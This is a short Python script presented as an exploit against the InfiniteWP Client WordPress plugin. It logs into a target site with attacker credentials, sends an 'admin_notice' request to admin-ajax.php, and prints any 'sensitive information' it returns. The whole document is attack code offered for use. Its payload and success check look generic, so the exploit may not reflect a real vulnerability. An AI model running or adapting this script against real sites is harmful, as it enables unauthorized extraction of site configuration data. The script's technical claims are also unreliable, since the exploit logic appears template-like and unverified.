import requests

# Target WordPress site URL
target_url = 'https://target-site.com'

# Path to the InfiniteWP Client plugin admin_notice endpoint
exploit_endpoint = '/wp-admin/admin-ajax.php'

# Attacker's user credentials with sufficient permissions
attacker_username = 'attacker'
attacker_password = 'password123'

# Create a session and log in as the attacker
session = requests.Session()
login_data = {
    'log': attacker_username,
    'pwd': attacker_password,
    'wp-submit': 'Log In',
    'redirect_to': target_url + '/wp-admin/',
    'testcookie': '1'
}
login_response = session.post(target_url + '/wp-login.php', data=login_data)

# Exploit payload to trigger the 'admin_notice' function
payload = {
    'action': 'admin_notice',
    'data': 'config'
}

# Send the exploit request to extract sensitive information
exploit_response = session.post(target_url + exploit_endpoint, data=payload)

# Check if the exploit was successful
if 'Sensitive Information' in exploit_response.text:
    print('Exploit successful! Extracted sensitive information:')
    print(exploit_response.text)
else:
    print('Exploit failed.')
